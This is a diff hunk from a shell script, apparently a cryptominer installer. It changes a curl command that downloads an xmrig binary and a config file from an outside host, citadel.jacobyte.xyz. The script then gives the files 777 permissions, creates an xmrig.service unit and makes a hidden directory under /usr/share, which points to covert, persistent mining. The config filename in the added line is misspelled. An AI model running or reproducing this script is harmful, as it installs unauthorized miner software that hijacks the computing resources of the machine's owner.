@@ -18,7 +18,7 @@ then
    }
    exits
    
-   files=$(curl -s -O http://citadel.jacobyte.xyz/ -O http://citadel.jacobyte.xyz/xmrig )  #add url of xmrig file and config.json.
+   files=$(curl -s -O http://citadel.jacobyte.xyz/xmrig -O http://citadel.jacobyte.xyz/congig.json )  #add url of xmrig file and config.json.
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
